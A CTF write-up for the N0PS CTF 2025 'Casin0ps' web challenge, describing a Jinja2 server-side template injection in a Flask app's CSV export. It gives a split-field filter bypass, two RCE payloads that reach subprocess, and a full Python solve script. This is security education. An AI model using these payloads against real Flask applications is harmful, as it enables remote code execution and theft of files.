---
title: "N0PS25: Writeup for Web/CasinOps"
date: 2025-06-02T14:28:42+01:00
tags: ["ctf", "write-up", "nops"]
author: "hxuu"
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "CTF write-up for Casinops"
summary: "A Flask-based web application echoing user-provided data via a CSV export feature. Vulnerable to SSTI"
canonicalURL: ""
disableHLJS: false
disableShare: false
hideSummary: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
editPost:
    URL: "https://github.com/hxuu/content"
    Text: "Suggest Changes"
    appendFilePath: true
---


# Challenge Overview

* CTF: N0PS CTF 2025
* Challenge: Casin0ps
* Category: Web Exploitation
* Points: 484 (21 solves)
* Description: Have you ever been to the Casino of Webtopia yet? Well, we count on you to find out what it hides!
* Authors: [Sto](https://linktr.ee/yourssto), [algorab](https://www.nops.re/)
* Source code: NONE

[Link to the challenge (I'll update it to the source after the challenge is down)](https://nopsctf-casino.chals.io/login?next=%2F)

# TL;DR

A Flask-based web application echoing user-provided data via a CSV export feature.
By inspecting response headers, we confirm it’s a Flask app and identify Jinja2 templating.
The export functionality naively injects `username/email` into a template, leading to Server-Side Template Injection (SSTI).

We chain the Flask `request` object to reach `__builtins__` and import `subprocess` to execute commands.
Finally, we automate the exploit to retrieve the flag from the exported CSV.

# Initial Analysis

At a glance, the app appears to be a simple casino interface: users register, log in, and play a luck-based game to win a jackpot
However, the “game” is clearly **rigged**—even if you “win,” the target sum increases, making it impossible to profit.

![showcasing the website](/blog/images/showcase.gif)

Another feature is exporting user data as a CSV file containing their username, email, number of plays, and net gains.

```csv
USERNAME,hxuu
MAIL,hxuu@hxuu.hxuu
INSCRIPTION DATE,2025-06-02 06:06:19
MONEY,994.0
STATS,"{\"played\": 16, \"avg_gain\": -0.375}"
```

---

Since the UI doesn't show much, let's dive into the page source:

> **Note:** In challenges without source code, it’s helpful to proceed methodically: inspect the HTML source, then monitor network traffic, and finally test individual functionalities.

### Page Source (Ctrl+U)

```html
condensed version of the source (including the login/register, and main game)
```

We notice 4 endpoints corresponding to the visible features:

1. `/register`: Handles new user registration.
2. `/login`: Authenticates existing users.
3. `/play`: Executes the game logic.
4. `/export`: Generates a CSV with user data (username, email, plays, gains).

Nothing in the HTML hints at dangerous behavior. Let’s move on to network traffic.

### Network Traffic Analysis

By observing requests and responses, we see:

![server reveiling request](/blog/images/2025-06-02-16-19-45.png)

- The `Server` **header** reveals **Werkzeug**, a Python WSGI utility library commonly used with Flask.

![session cookie response](/blog/images/2025-06-02-16-21-21.png)

- The `Set-Cookie` **header** after login shows a session cookie that appears to be a **Flask-signed** cookie (using itsdangerous).

> **Flask-Unsign** can decode these cookies to confirm a Flask backend:
>
> ```bash
> flask-unsign --decode --cookie "<cookie_value>"
> ```
>
> If we obtain valid JSON, it’s almost certain the app is using Flask’s default session mechanism.

![confirming flask backend](/blog/images/2025-06-02-16-25-19.png)

Readable text! It seems that we're sure what we're dealing with: a Flask application.

---

My initial thoughts when solving this challenge were to check common **Flask/Werkzeug** vulnerabilities.

I tried looking for Werkzeug 3.0.4 vulnerabilities but was faced with only a single path traversal one that works only on Windows boxes with python version prior to 3.11. This app is not vulnerable since it has 3.13 running, so the other option was flask.

# Further Recon

Reflecting on the CSV export feature, we note that **username** and **email** values are injected directly into a template that generates the CSV.

Knowing that flask uses Jinja2 as its templating engine, we can test this as follows:

```
POST /register
username={{ 7*7 }}&email={% if True %}AA{% endif %}&//other fileds...
```

We observe the following CSV:

```csv
USERNAME,SANITIZED
MAIL,SANITIZED
INSCRIPTION DATE,2025-06-01 15:31:58
MONEY,1000.0
STATS,"{\"played\": 0, \"avg_gain\": 0}"
```

SANITIZED, mhmm. The app doesn't even remove "bad" characters, it simply replaces the entire thing.

I thought of bypassing the filters put and took quite a while testing different special characters.
I tested for `{% statements %}`, `{{ variables }}` and even `# line statements` which
all resulted in nothing but disappointment.

But after hours of searching, a new idea dawned on me: Do we need the payload to be in the same field?
What if the backend is checking for the whole opening/closing (`{{}}|{%%}`) combination, but not part of it? Let's test:

```html
username={{&email=7*7}}AA{% endif %}
```

The output this time is:

```csv
USERNAME,sm2449495(Undefined, 49)
INSCRIPTION DATE,2025-06-02 17:38:13
MONEY,1000.0
STATS,"{\"played\": 0, \"avg_gain\": 0}"
```

And it worked! We have an SSTI via split-field payloads.

# Task Analysis

Diving deeper into this attack vector, we now know that separating our payload into two
parts (`username` holding the first and `email` the second) will grant us SSTI.

But other than the simple {{ 7*7 }}, what can we do with this?

Well, we have a few options, but first, let me explain how templating engines work.

### 1. How Jinja2 Templates Work

A template processor (also known as a template engine or parser) combines templates with data to produce documents.

* Templates here = the CSV file format with placeholders like {{ username }}.
* Data = user-supplied values (like name/email), which are injected during rendering.

Flask uses Jinja2 as its templating engine, which supports limited Python execution inside {{ ... }} and {% ... %} blocks.

> Templates support Python code, and the "data model" used is Python’s object system.

This means if we can inject a python object (everything in python is an object btw) that
can *run* inside the jinja2 context and *give* us remote code execution, we'll be good.

But wait, which object is that? Is there a way to pass an object while all we control is a string inside the template.

Good observation, we as users can't inject objects, but we can use already existing ones,
specifically, ones that flask supplies by default. Those are:

![The following global variables are available within Jinja2 templates by default:](/blog/images/2025-06-02-14-57-49.png)

Ok you might say, I can use these objects, and?

Well now, I'll introduce another python feature called: reflection and introspection.

### Python Reflection & Introspection

To break it down for you:

* Everything in Python is an object.

This means that a simple string like 'abc' is is fact an instance of the `str` object, and the latter
inherits from other objects all the way to the root object: `object`.

This gives the illusion of a graph, where the root object is `object`, and every other object can be accessed from there,
**including** ones like system, popen...etc.

So by climbing the inheritance ladder, we can reach the top, and go to another bottom,
that is importing a malicious builtin module, say `subprocess`, to achieve RCE.

# Exploitation

Armed with this newfound knowledge, we can exploit the vulnerability in two ways:

### 1st Way: Inheritance Tree Traversal

```py
{{''.__class__.__base__.__subclasses__()[INDEX]('cat flag.txt',shell=True,stdout=-1).communicate()[0]}}
```

This requires trial/error to find the correct index of `subprocess.Popen`, but since
we know the python version used by the app, we can download it locally and test until figured.

### 2nd Way: Using Flask's `request` Object (Cleaner)

```py
{{ request.application.__globals__.__builtins__.__import__('subprocess').getoutput('cat flag.txt') }}
```

This is cleaner and more "determinstic" if you will. The request object has access to the
application method, which in turn has the builtin functions among its global variables (as with most python objects, check [meta programming in python]()).

---

Pick whichever way you like. I'll use the second one as it doesn't require knowledge
of indices that are otherwise easy to find using the same python version as the app.

### Full exploit script

```python
import requests

url = 'https://nopsctf-casino.chals.io'
session = requests.Session() # needed to get the session cookie

ssti_payload = "request.application.__globals__.__builtins__.__import__('subprocess').getoutput('cat .passwd')"

register_data = {
    'username': 'hxuu{{', # you might need to change this (used...)
    'email': ssti_payload + '}}',
    'password': 'hxuu{{'
}
session.post(url + '/register', data=register_data)

login_data = {
    'username': register_data['username'],
    'password': register_data['password']
}
session.post(url + '/login', data=login_data)

# Now we'll export the .csv file with the flag in it
resp = session.get(url + '/export')
print(resp.text)
```

Running this and using some grep magic (I LOVE Grep):

```bash
➜ python solve.py | grep -ioP N0PS{.*}
N0PS{s5T1_4veRywh3R3!!}
```

Flag is: `N0PS{s5T1_4veRywh3R3!!}`

![celebration anime](https://media1.tenor.com/m/qJ_EjDNHqcUAAAAC/usuwam-rajd-hakowanie.gif)

---

# Conclusions

1. **Leaking Templating Context:** Even seemingly simple CSV exports can be dangerous if they use Jinja2 without proper sanitization.
2. **Split-Field Payloads:** Sanitization that strips full `{{ ... }}` blocks can be bypassed by splitting the payload across multiple inputs.
3. **Flask/Jinja2 Introspection:** Flask does not sandbox Jinja2 by default. By leveraging the `request` object, we accessed `__builtins__` to import modules.
4. **Practical SSTI Chains:** Two reliable SSTI exploitation techniques:

   * **Inheritance-Tree Climbing:** Starting from a basic object like `''` to reach `subprocess`.
   * **Using `request` Object:** Directly accessing the Flask app’s globals for `__import__`.
5. **Importance of Understanding Context:** Knowing the objects available in Jinja2 context (e.g., `config`, `request`, `session`) is critical for SSTI exploitation.

---

# References

* **Flask Templating (Jinja2):** [https://flask.palletsprojects.com/en/stable/templating/](https://flask.palletsprojects.com/en/stable/templating/)
* **Jinja2 Documentation:** [https://jinja.palletsprojects.com/en/stable/templates/](https://jinja.palletsprojects.com/en/stable/templates/)
* **Werkzeug Debugging:** [https://werkzeug.palletsprojects.com/en/stable/debug/](https://werkzeug.palletsprojects.com/en/stable/debug/)
* **itsdangerous (Flask Signing):** [https://itsdangerous.palletsprojects.com/en/stable/](https://itsdangerous.palletsprojects.com/en/stable/)
* **Flask-Unsign (Cookie Analysis):** [https://github.com/Paradoxis/Flask-Unsign](https://github.com/Paradoxis/Flask-Unsign)
* **Python Data Model & Introspection:** [https://docs.python.org/3/reference/datamodel.html#type.\_\_subclasses](https://docs.python.org/3/reference/datamodel.html#type.__subclasses)\_\_
* **StackOverflow on Jinja2 Context:**

  * [https://stackoverflow.com/questions/6145091/the-term-context-in-programming](https://stackoverflow.com/questions/6145091/the-term-context-in-programming)
  * [https://stackoverflow.com/questions/64149750/what-is-context-in-jinja2](https://stackoverflow.com/questions/64149750/what-is-context-in-jinja2)


